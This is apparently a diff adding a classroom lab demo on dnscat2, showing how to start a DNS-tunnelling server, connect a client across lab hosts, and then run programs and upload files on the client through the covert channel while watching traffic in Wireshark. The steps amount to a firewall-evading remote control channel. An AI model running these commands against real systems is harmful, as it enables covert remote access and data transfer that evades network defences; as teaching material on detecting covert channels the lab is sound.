@@ -1,0 +1,94 @@
+== DNSCAT2 Demo
+
+{empty} +
+
+*Learning Objectives / Outcomes*
+
+.SKILL 10: Perform file transfers
+
+** 10.2 Describe covert methods for transferring files
+
+{empty} +
+
+.SKILL 12: Define the principles of tunneling network traffic
+
+** 12.4 Explain the challenges of discovering covert channels
+
+{empty} +
+
+== Demo Walk-through
+
+{empty} +
+
+_DNSCAT is designed much like netcat but with some specific and interesting additional features. The tool allows hosts to communicate over the Internet via DNS. 
+The client side of the tool will route all traffic through the local DNS server. The traffic is forwarded to the server side of the tool, which needs to be an authoritative DNS server.
+You can use the tool without a domain however, and connect the client and server directly as a proof of concept. A big advantage of this tool is that DNS traffic generally bypasses host and network firewalls._
+
+{empty} +
+
+In this demonstration, H1 (Debian GUI host) will act as the client. This is so that we can watch the traffic via wireshark. H3 (Debian CMD Line host) will act as the server.
+
+*Follow the below steps*
+
+
+{empty} +
+
+
+=== Server Setup
+ 
+{empty} +
+ 
+1) Log into H3. It is best to make yourself root, so you don't have to use sudo as you bring up the tool.
+
+2) Navigate to /dnscat2/server/
+
+3) Run the server script with the following command:  "ruby dnscat.rb --secret=SECRET"  (the secret can be anything you choose, it is for encryption of the channel [PSK])
+
+4) If the server comes up successfully, you should see your prompt change to: dnscat2>
+
+5) Now that your server is up and running, you can connect to it with your client.
+
+{empty} +
+
+=== Client Setup
+ 
+{empty} +
+ 
+  
+1) Log into H1. Bring up a shell; it is best to make yourself root, so you don't have to use sudo as you bring up the tool.
+
+2) Navigate to /dnscat2/client/
+
+3) Ensure that the dnscat executable file exists in this directory. If not, simple use the command: "make" to complete the client installation;
+
+4) Connect the client to the server with the following command:  "./dnscat --dns server=10.2.0.4,host=10.1.0.2,port=53 --secret=SECRET"  (the secret is whatever you set on the server for encryption of the channel [PSK])
+
+5) This should connect the client successful and display a message that the connection is established.
+
+6) You should open wireshark and observe the DNS traffic that this connection creates.
+
+7) Leaving the connection open, move back over to the server.
+
+{empty} +
+
+=== Accessing the client from the server
+ 
+{empty} +
+ 
+1) Back at the H3 host (server), check the windows (which are the connected clients) with the command: "windows"
+ 
+2) once you identify the session number assigned to the client connection you made from H1, you can enter a shell and interact with the client.
+ 
+3) Use the command: "session -i 1"  (the connection number should be 1, but if not, use the appropriate number)
+
+4) From here, you can use the "help" option to see the commands that are available.
+
+5) you can open programs on the remote machine with "exec [program...like firefox]" or try uploading a file from the server to the client with the "upload" command.
+ 
+_Imagine the power this provides to the person in control on the server!_
+ 
+{empty} +
+ 
+*References:* 
+
+** https://wiki.skullsecurity.org/Dnscat
